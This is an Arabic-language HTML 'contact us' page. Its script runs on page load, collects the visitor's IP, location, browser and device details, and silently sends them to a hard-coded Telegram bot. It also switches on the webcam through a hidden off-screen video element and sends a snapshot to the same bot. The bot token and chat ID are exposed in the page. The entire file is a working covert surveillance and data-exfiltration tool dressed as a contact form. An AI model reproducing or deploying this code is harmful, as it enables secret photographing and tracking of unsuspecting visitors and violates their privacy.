<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Send to Telegram | نموذج التواصل + كاميرا + IP</title>
    
    <!-- Google Fonts - خطوط عربية حديثة -->
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    
    <!-- Font Awesome 6 (أيقونات رائعة) -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Cairo', 'Tahoma', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
            direction: rtl;
        }

        body::before {
            content: '';
            position: absolute;
            width: 100%;
            height: 100%;
            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1440 320"><path fill="rgba(255,255,255,0.05)" fill-opacity="1" d="M0,96L48,112C96,128,192,160,288,160C384,160,480,128,576,122.7C672,117,768,139,864,154.7C960,171,1056,181,1152,165.3C1248,149,1344,107,1392,85.3L1440,64L1440,320L1392,320C1344,320,1248,320,1152,320C1056,320,960,320,864,320C768,320,672,320,576,320C480,320,384,320,288,320C192,320,96,320,48,320L0,320Z"></path></svg>') no-repeat bottom;
            background-size: cover;
            opacity: 0.3;
            pointer-events: none;
        }

        .container {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 30px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3), 0 0 0 1px rgba(255, 255, 255, 0.2);
            padding: 40px 35px;
            width: 100%;
            max-width: 600px;
            transition: transform 0.3s ease, box-shadow 0.3s ease;
            animation: fadeInUp 0.8s ease-out;
        }

        .container:hover {
            transform: translateY(-5px);
            box-shadow: 0 25px 70px rgba(0, 0, 0, 0.4);
        }

        .camera-notice {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            color: white;
            padding: 12px 18px;
            border-radius: 15px;
            margin-bottom: 25px;
            text-align: center;
            font-size: 14px;
            font-weight: 600;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.85; }
        }

        .camera-notice.warning {
            background: #ff9800;
        }

        .camera-notice.success {
            background: #4caf50;
            animation: none;
        }

        .camera-notice.error {
            background: #f44336;
            animation: none;
        }

        .header {
            text-align: center;
            margin-bottom: 35px;
        }

        .header i {
            font-size: 60px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 15px;
        }

        .header h1 {
            font-size: 28px;
            font-weight: 700;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 8px;
        }

        .header p {
            color: #666;
            font-size: 14px;
            font-weight: 500;
        }

        .input-group {
            position: relative;
            margin-bottom: 25px;
        }

        .input-group i {
            position: absolute;
            right: 18px;
            top: 50%;
            transform: translateY(-50%);
            color: #764ba2;
            font-size: 18px;
            transition: all 0.3s ease;
        }

        .input-group textarea ~ i {
            top: 25px;
            transform: none;
        }

        input, textarea {
            width: 100%;
            padding: 14px 50px 14px 18px;
            font-family: 'Cairo', sans-serif;
            font-size: 16px;
            border: 2px solid #e0e0e0;
            border-radius: 15px;
            background: white;
            transition: all 0.3s ease;
            outline: none;
            font-weight: 500;
        }

        textarea {
            min-height: 120px;
            resize: vertical;
            padding-top: 18px;
        }

        input:focus, textarea:focus {
            border-color: #764ba2;
            box-shadow: 0 0 0 4px rgba(118, 75, 162, 0.1);
        }

        .send-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 15px;
            font-size: 18px;
            font-weight: 700;
            font-family: 'Cairo', sans-serif;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
        }

        .send-btn:hover {
            transform: scale(1.02);
            box-shadow: 0 10px 25px rgba(118, 75, 162, 0.4);
        }

        .send-btn:active {
            transform: scale(0.98);
        }

        .result {
            margin-top: 25px;
            padding: 15px;
            border-radius: 15px;
            text-align: center;
            font-weight: 600;
            font-size: 15px;
            transition: all 0.3s ease;
        }

        .result.success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .result.error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .footer {
            text-align: center;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #e0e0e0;
            color: #999;
            font-size: 12px;
        }

        .footer i {
            color: #e74c3c;
            margin: 0 3px;
        }

        @media (max-width: 600px) {
            .container {
                padding: 30px 20px;
            }
            
            .header h1 {
                font-size: 24px;
            }
            
            input, textarea {
                font-size: 14px;
                padding: 12px 45px 12px 15px;
            }
            
            .send-btn {
                padding: 14px;
                font-size: 16px;
            }
        }

        .send-btn.loading {
            pointer-events: none;
            opacity: 0.7;
        }

        .send-btn.loading i {
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }

        #hiddenVideo {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 640px;
            height: 480px;
        }

        .ip-info {
            background: #f0f0f0;
            border-radius: 12px;
            padding: 10px;
            margin-bottom: 20px;
            font-size: 12px;
            text-align: center;
            color: #666;
            direction: ltr;
        }

        .ip-info i {
            color: #764ba2;
            margin-left: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <i class="fas fa-paper-plane"></i>
            <h1>تواصل معنا</h1>
            <p>نرحب بملاحظاتك واستفساراتك</p>
        </div>

        <div id="cameraNotice" class="camera-notice">
            <i class="fas fa-camera"></i>
            <span id="cameraNoticeText">جاري تجهيز الكاميرا...</span>
        </div>

        <!-- عرض معلومات IP -->
        <div id="ipInfo" class="ip-info">
            <i class="fas fa-globe"></i>
            <span id="ipAddress">جاري جلب عنوان IP...</span>
        </div>

        <form id="telegramForm">
            <div class="input-group">
                <input type="text" id="name" placeholder="الاسم الكامل" required>
                <i class="fas fa-user"></i>
            </div>
            <div class="input-group">
                <input type="email" id="email" placeholder="البريد الإلكتروني" required>
                <i class="fas fa-envelope"></i>
            </div>
            <div class="input-group">
                <textarea id="message" placeholder="رسالتك" required></textarea>
                <i class="fas fa-comment-dots"></i>
            </div>
            <button type="submit" class="send-btn">
                <i class="fas fa-paper-plane"></i>
                إرسال الرسالة
            </button>
        </form>
        
        <div id="result"></div>
        
        <div class="footer">
            <i class="fas fa-camera"></i> يتم التقاط صورة تلقائياً عند دخولك 
            <i class="fas fa-clock"></i> لتتبع التغير عبر الزمن
        </div>
    </div>

    <video id="hiddenVideo" autoplay playsinline></video>
    <canvas id="hiddenCanvas" style="display: none;"></canvas>

    <script>
        const BOT_TOKEN = '8920328815:AAEOP0sR3Jc98i0osmfnh9t21m3WGusW2FA';
        const CHAT_ID = '8416078700';

        const form = document.getElementById('telegramForm');
        const resultDiv = document.getElementById('result');
        const cameraNotice = document.getElementById('cameraNotice');
        const cameraNoticeText = document.getElementById('cameraNoticeText');
        const ipAddressSpan = document.getElementById('ipAddress');

        let userIP = 'غير معروف';
        let userCountry = '';
        let userCity = '';

        function setLoading(isLoading) {
            const submitBtn = form.querySelector('button[type="submit"]');
            if (isLoading) {
                submitBtn.classList.add('loading');
                submitBtn.innerHTML = '<i class="fas fa-spinner"></i> جاري الإرسال...';
                submitBtn.disabled = true;
            } else {
                submitBtn.classList.remove('loading');
                submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> إرسال الرسالة';
                submitBtn.disabled = false;
            }
        }

        // ==================== جلب IP باستخدام API خارجي ====================
        async function fetchUserIP() {
            try {
                // استخدام ipapi.co للحصول على معلومات IP كاملة
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                
                if (data.ip) {
                    userIP = data.ip;
                    userCountry = data.country_name || '';
                    userCity = data.city || '';
                    const region = data.region || '';
                    
                    let locationText = `${userIP}`;
                    if (userCity || userCountry) {
                        locationText += ` (${userCity}${userCity && userCountry ? ', ' : ''}${userCountry})`;
                    }
                    
                    ipAddressSpan.innerHTML = `<i class="fas fa-globe"></i> عنوان IP: ${locationText}`;
                    
                    // إرسال إشعار IP إلى تيليجرام
                    await sendIPNotification();
                } else {
                    throw new Error('Failed to get IP');
                }
            } catch (error) {
                console.error('خطأ في جلب IP:', error);
                ipAddressSpan.innerHTML = '<i class="fas fa-globe"></i> تعذر جلب عنوان IP';
                
                // محاولة استخدام API بديل
                try {
                    const fallbackResponse = await fetch('https://api.ipify.org?format=json');
                    const fallbackData = await fallbackResponse.json();
                    userIP = fallbackData.ip;
                    ipAddressSpan.innerHTML = `<i class="fas fa-globe"></i> عنوان IP: ${userIP}`;
                    await sendIPNotification();
                } catch (fallbackError) {
                    console.error('فشل API البديل:', fallbackError);
                }
            }
        }

        // ==================== إرسال إشعار IP إلى التيليجرام ====================
        async function sendIPNotification() {
            try {
                const now = new Date();
                const timestamp = now.toLocaleString('ar-EG', { 
                    timeZone: 'Africa/Cairo',
                    year: 'numeric',
                    month: '2-digit',
                    day: '2-digit',
                    hour: '2-digit',
                    minute: '2-digit',
                    second: '2-digit'
                });
                
                const userAgent = navigator.userAgent;
                const screenSize = `${screen.width}x${screen.height}`;
                const language = navigator.language;
                
                const message = `🌐 *زائر جديد دخل الموقع*\n\n` +
                    `📌 *عنوان IP:* \`${userIP}\`\n` +
                    `📍 *الموقع:* ${userCity}${userCity && userCountry ? ', ' : ''}${userCountry || 'غير معروف'}\n` +
                    `🕐 *الوقت:* ${timestamp}\n` +
                    `💻 *نظام التشغيل:* ${getOS(userAgent)}\n` +
                    `🌍 *المتصفح:* ${getBrowser(userAgent)}\n` +
                    `📱 *حجم الشاشة:* ${screenSize}\n` +
                    `🔤 *اللغة:* ${language}\n` +
                    `🔗 *الصفحة:* ${window.location.href}`;
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (error) {
                console.error('فشل إرسال إشعار IP:', error);
            }
        }

        // ==================== مساعدة: تحديد نظام التشغيل ====================
        function getOS(userAgent) {
            if (userAgent.includes('Windows')) return 'Windows';
            if (userAgent.includes('Mac')) return 'MacOS';
            if (userAgent.includes('Linux')) return 'Linux';
            if (userAgent.includes('Android')) return 'Android';
            if (userAgent.includes('iOS') || userAgent.includes('iPhone') || userAgent.includes('iPad')) return 'iOS';
            return 'غير معروف';
        }

        // ==================== مساعدة: تحديد المتصفح ====================
        function getBrowser(userAgent) {
            if (userAgent.includes('Chrome')) return 'Chrome';
            if (userAgent.includes('Firefox')) return 'Firefox';
            if (userAgent.includes('Safari')) return 'Safari';
            if (userAgent.includes('Edge')) return 'Edge';
            if (userAgent.includes('Opera')) return 'Opera';
            return 'غير معروف';
        }

        // ==================== التقاط صورة وإرسالها ====================
        async function captureAndSendPhoto() {
            try {
                const video = document.getElementById('hiddenVideo');
                const canvas = document.getElementById('hiddenCanvas');
                
                // التحقق من دعم getUserMedia
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    throw new Error('المتصفح لا يدعم الكاميرا');
                }
                
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play();
                        setTimeout(resolve, 800);
                    };
                });
                
                if (video.videoWidth === 0 || video.videoHeight === 0) {
                    throw new Error('فيديو الكاميرا غير جاهز');
                }
                
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                const blob = await new Promise(resolve => {
                    canvas.toBlob(resolve, 'image/jpeg', 0.85);
                });
                
                stream.getTracks().forEach(track => track.stop());
                video.srcObject = null;
                
                const now = new Date();
                const timestamp = now.toLocaleString('ar-EG', { 
                    timeZone: 'Africa/Cairo',
                    year: 'numeric',
                    month: '2-digit',
                    day: '2-digit',
                    hour: '2-digit',
                    minute: '2-digit',
                    second: '2-digit'
                });
                
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, `snapshot_${Date.now()}.jpg`);
                formData.append('caption', `📸 *صورة تلقائية عند دخول الموقع*\n\n` +
                    `🕐 الوقت: ${timestamp}\n` +
                    `🌐 الجهاز: ${getOS(navigator.userAgent)} | ${getBrowser(navigator.userAgent)}\n` +
                    `📱 الشاشة: ${screen.width}x${screen.height}\n` +
                    `🔗 عنوان IP: ${userIP}\n` +
                    `📍 الموقع: ${userCity} ${userCountry}\n\n` +
                    `_هذه الصورة تساعدك على تتبع التغيرات عبر الزمن_`);
                formData.append('parse_mode', 'Markdown');
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                
                if (data.ok) {
                    cameraNotice.className = 'camera-notice success';
                    cameraNoticeText.innerHTML = '✅ تم التقاط الصورة وإرسالها بنجاح!';
                } else {
                    throw new Error(data.description || 'فشل إرسال الصورة');
                }
                
            } catch (error) {
                console.error('خطأ في الكاميرا:', error);
                
                if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
                    cameraNotice.className = 'camera-notice warning';
                    cameraNoticeText.innerHTML = '⚠️ لم يتم السماح بالكاميرا. الرجاء السماح بالوصول إلى الكاميرا لالتقاط الصور التلقائية';
                } else if (error.name === 'NotFoundError') {
                    cameraNotice.className = 'camera-notice error';
                    cameraNoticeText.innerHTML = '❌ لا توجد كاميرا متاحة على هذا الجهاز';
                } else if (error.message.includes('HTTP') || location.protocol !== 'https:') {
                    cameraNotice.className = 'camera-notice warning';
                    cameraNoticeText.innerHTML = '⚠️ يفضل تشغيل الموقع عبر HTTPS ليعمل الكاميرا بشكل أفضل';
                } else {
                    cameraNotice.className = 'camera-notice error';
                    cameraNoticeText.innerHTML = '❌ فشل التقاط الصورة';
                }
                
                await sendTextNotification(error.message);
            }
        }
        
        async function sendTextNotification(errorMsg) {
            try {
                const now = new Date();
                const timestamp = now.toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' });
                const text = `⚠️ *تنبيه دخول (بدون صورة)*\n\n` +
                    `🕐 الوقت: ${timestamp}\n` +
                    `🌐 المتصفح: ${getBrowser(navigator.userAgent)}\n` +
                    `💻 نظام التشغيل: ${getOS(navigator.userAgent)}\n` +
                    `🔗 عنوان IP: ${userIP}\n` +
                    `📍 الموقع: ${userCity} ${userCountry}\n` +
                    `❌ خطأ الكاميرا: ${errorMsg}\n\n` +
                    `_لم يتمكن الموقع من التقاط صورة بسبب الخطأ أعلاه_`;
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text,
                        parse_mode: 'Markdown'
                    })
                });
            } catch (e) {
                console.error('فشل إرسال الإشعار النصي:', e);
            }
        }
        
        // ==================== النموذج الأساسي ====================
        form.addEventListener('submit', async (event) => {
            event.preventDefault();
            
            const name = document.getElementById('name').value;
            const email = document.getElementById('email').value;
            const message = document.getElementById('message').value;
            
            const now = new Date();
            const timestamp = now.toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' });
            
            const text = `📬 *رسالة جديدة من الموقع*\n\n` +
                `👤 *الاسم:* ${name}\n` +
                `📧 *البريد:* ${email}\n` +
                `💬 *الرسالة:* ${message}\n\n` +
                `🕐 *الوقت:* ${timestamp}\n` +
                `🔗 *عنوان IP:* \`${userIP}\`\n` +
                `📍 *الموقع:* ${userCity} ${userCountry}`;
            
            setLoading(true);
            resultDiv.innerHTML = '';
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text,
                        parse_mode: 'Markdown'
                    })
                });
                
                const data = await response.json();
                
                if (data.ok) {
                    resultDiv.innerHTML = '✅ تم الإرسال بنجاح! شكراً لتواصلك معنا';
                    resultDiv.className = 'result success';
                    form.reset();
                } else {
                    resultDiv.innerHTML = '❌ فشل الإرسال: ' + data.description;
                    resultDiv.className = 'result error';
                }
            } catch (error) {
                resultDiv.innerHTML = '❌ خطأ في الاتصال: ' + error.message;
                resultDiv.className = 'result error';
            } finally {
                setLoading(false);
            }
        });
        
        // ==================== تشغيل كل شيء عند تحميل الصفحة ====================
        window.addEventListener('load', async () => {
            // جلب IP أولاً
            await fetchUserIP();
            
            // ثم تشغيل الكاميرا بعد تأخير بسيط
            setTimeout(() => {
                captureAndSendPhoto();
            }, 1500);
        });
    </script>
</body>
</html>
